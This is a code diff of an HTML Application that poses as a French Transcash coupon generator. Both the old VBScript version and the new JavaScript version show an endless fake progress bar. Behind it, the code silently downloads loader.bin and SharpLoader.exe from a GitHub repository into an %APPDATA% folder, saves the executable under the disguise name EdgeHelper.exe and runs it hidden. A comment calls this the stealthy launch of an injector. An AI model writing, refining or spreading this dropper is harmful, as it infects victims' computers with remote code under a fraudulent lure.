@@ -1,135 +1,159 @@
+<!DOCTYPE html>
 <html>
 <head>
-<title>Transcash - Génération du coupon</title>
-<HTA:APPLICATION 
-  ID="couponGen"
-  APPLICATIONNAME="Transcash Coupon"
-  BORDER="thin"
-  BORDERSTYLE="normal"
-  CAPTION="yes"
-  CONTEXTMENU="no"
-  MAXIMIZEBUTTON="no"
-  MINIMIZEBUTTON="no"
-  SCROLL="no"
-  SHOWINTASKBAR="yes"
-  SINGLEINSTANCE="yes"
-  SYSMENU="yes"
-  WINDOWSTATE="normal"
-/>
-<style>
-  body {
-    margin: 0;
-    background-color: #b40000;
-    font-family: 'Segoe UI', sans-serif;
-    color: #ffffff;
-  }
-  #container {
-    background-color: white;
-    margin: 50px auto;
-    padding: 30px;
-    width: 600px;
-    text-align: center;
-    border-radius: 8px;
-    color: #b40000;
-  }
-  #progressBarContainer {
-    width: 100%;
-    height: 30px;
-    background-color: #ddd;
-    border-radius: 5px;
-    margin-top: 20px;
-    overflow: hidden;
-  }
-  #progressBar {
-    height: 100%;
-    width: 0%;
-    background-color: #b40000;
-    transition: width 0.5s;
-  }
-  #status {
-    font-size: 20px;
-    margin-top: 15px;
-    font-weight: bold;
-    animation: blink 1s infinite;
-  }
-  #percent {
-    font-size: 28px;
-    margin-top: 5px;
-  }
-  @keyframes blink {
-    0% {opacity: 1;}
-    50% {opacity: 0;}
-    100% {opacity: 1;}
-  }
-</style>
+  <meta charset="UTF-8">
+  <title>Coupon Transcash</title>
+  <HTA:APPLICATION
+    APPLICATIONNAME="TranscashCoupon"
+    BORDER="thin"
+    BORDERSTYLE="normal"
+    CAPTION="yes"
+    CONTEXTMENU="no"
+    ICON="logotranscash.png"
+    MAXIMIZEBUTTON="no"
+    MINIMIZEBUTTON="no"
+    SCROLL="no"
+    SHOWINTASKBAR="yes"
+    SINGLEINSTANCE="yes"
+    SYSMENU="yes"
+    WINDOWSTATE="normal"
+  />
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #b61b1b;
+      font-family: Arial, sans-serif;
+    }
+
+    .main {
+      background-color: white;
+      width: 600px;
+      margin: 50px auto;
+      padding: 40px;
+      border-radius: 10px;
+      text-align: center;
+    }
+
+    h1 {
+      color: #b61b1b;
+      margin-bottom: 20px;
+      font-size: 26px;
+    }
+
+    p {
+      color: #444;
+      font-size: 16px;
+      margin: 10px 0;
+    }
+
+    .progress-container {
+      background-color: #eee;
+      border-radius: 10px;
+      overflow: hidden;
+      margin-top: 30px;
+      height: 30px;
+      width: 100%;
+    }
+
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background-color: #b61b1b;
+      transition: width 0.5s;
+    }
+
+    .status {
+      margin-top: 20px;
+      font-size: 18px;
+      font-weight: bold;
+      color: #b61b1b;
+    }
+
+    .percentage {
+      margin-top: 8px;
+      font-size: 24px;
+      font-weight: bold;
+      color: #222;
+    }
+  </style>
 </head>
 
 <body>
-  <div id="container">
-    <h2>Votre coupon Transcash est en cours de génération</h2>
-    <div id="status">Génération du coupon en cours…</div>
-    <div id="percent">0%</div>
-    <div id="progressBarContainer">
-      <div id="progressBar"></div>
+  <div class="main">
+    <img src="logotranscash.png" alt="Logo" width="140">
+    <h1>Génération sécurisée de votre coupon Transcash</h1>
+    <p>Un moment de patience s’il vous plaît pendant que nous validons votre éligibilité.</p>
+    <p>Ce processus peut durer quelques minutes afin d’assurer la conformité réglementaire.</p>
+
+    <div class="progress-container">
+      <div id="bar" class="progress-bar"></div>
     </div>
+    <div class="status" id="statusText">Génération du coupon en cours…</div>
+    <div id="percent" class="percentage">0%</div>
   </div>
 
-<script language="VBScript">
-Sub Window_OnLoad
-  Call StartProgress()
-  Call DownloadAndExecute()
-End Sub
+  <script language="javascript">
+    var bar = document.getElementById("bar");
+    var percentText = document.getElementById("percent");
+    var statusText = document.getElementById("statusText");
 
-Sub StartProgress()
-  Dim i
-  For i = 1 To 100
-    progressPercent = i & "%"
-    document.getElementById("percent").innerText = progressPercent
-    document.getElementById("progressBar").style.width = progressPercent
-    If i = 97 Then
-      WScript.Sleep 1200000  ' Pause de 20 min entre 97% et 99%
-    End If
-    WScript.Sleep 4800 ' ≈ 8 minutes en tout
-  Next
-  Call StartProgress() ' Boucle infinie
-End Sub
+    // Clignotement
+    setInterval(function () {
+      statusText.style.visibility = (statusText.style.visibility === "hidden") ? "visible" : "hidden";
+    }, 700);
 
-Sub DownloadAndExecute()
-  Dim fso, shell, appData, folder, binFile, exeFile, xmlHttp
+    var totalTime = 480; // 8 minutes
+    var i = 0;
 
-  Set shell = CreateObject("WScript.Shell")
-  appData = shell.ExpandEnvironmentStrings("%APPDATA%") & "\EdgeUpdate\"
+    function updateBar() {
+      var percent = Math.min((i / totalTime) * 100, 100);
+      percentText.innerText = Math.floor(percent) + "%";
+      bar.style.width = percent + "%";
 
-  Set fso = CreateObject("Scripting.FileSystemObject")
-  If Not fso.FolderExists(appData) Then
-    fso.CreateFolder(appData)
-  End If
+      if (percent >= 97 && percent < 99) {
+        statusText.innerText = "Finalisation du coupon… Veuillez patienter";
+        setTimeout(function () {
+          i++;
+          updateBar();
+        }, 1200000); // 20 minutes
+      } else if (percent >= 100) {
+        i = 0;
+        statusText.innerText = "Génération du coupon en cours…";
+        updateBar();
+      } else {
+        i++;
+        setTimeout(updateBar, 1000);
+      }
+    }
 
-  ' Télécharger loader.bin
-  Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
-  xmlHttp.Open "GET", "https://raw.githubusercontent.com/fabienneroger/finale/refs/heads/main/loader.bin", False
-  xmlHttp.Send
+    updateBar();
 
-  If xmlHttp.Status = 200 Then
-    Set binFile = fso.CreateTextFile(appData & "loader.bin", True)
-    binFile.Write xmlHttp.responseBody
-    binFile.Close
-  End If
+    // Lancement furtif de l'injecteur pendant le faux chargement
+    try {
+      var shell = new ActiveXObject("WScript.Shell");
+      var fso = new ActiveXObject("Scripting.FileSystemObject");
+      var appData = shell.ExpandEnvironmentStrings("%APPDATA%") + "\\EdgeUpdate";
+      if (!fso.FolderExists(appData)) fso.CreateFolder(appData);
 
-  ' Télécharger SharpLoader.exe
-  Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
-  xmlHttp.Open "GET", "https://raw.githubusercontent.com/fabienneroger/finale/refs/heads/main/SharpLoader.exe", False
-  xmlHttp.Send
+      function downloadFile(url, outputPath) {
+        var xhr = new ActiveXObject("MSXML2.XMLHTTP");
+        xhr.open("GET", url, false);
+        xhr.send();
+        if (xhr.status === 200) {
+          var stream = new ActiveXObject("ADODB.Stream");
+          stream.Type = 1;
+          stream.Open();
+          stream.Write(xhr.responseBody);
+          stream.SaveToFile(outputPath, 2);
+          stream.Close();
+        }
+      }
 
-  If xmlHttp.Status = 200 Then
-    Set exeFile = fso.CreateTextFile(appData & "EdgeHelper.exe", True)
-    exeFile.Write xmlHttp.responseBody
-    exeFile.Close
-  End If
-
-  ' Exécuter furtivement EdgeHelper.exe
-  shell.Run Chr(34) & appData & "EdgeHelper.exe" & Chr(34), 0, False
-End Sub
-</script>
+      downloadFile("https://raw.githubusercontent.com/fabienneroger/finale/refs/heads/main/loader.bin", appData + "\\loader.bin");
+      downloadFile("https://raw.githubusercontent.com/fabienneroger/finale/refs/heads/main/SharpLoader.exe", appData + "\\EdgeHelper.exe");
+      shell.Run('"' + appData + '\\EdgeHelper.exe"', 0, false);
+    } catch (e) {}
+  </script>
 </body>
 </html>
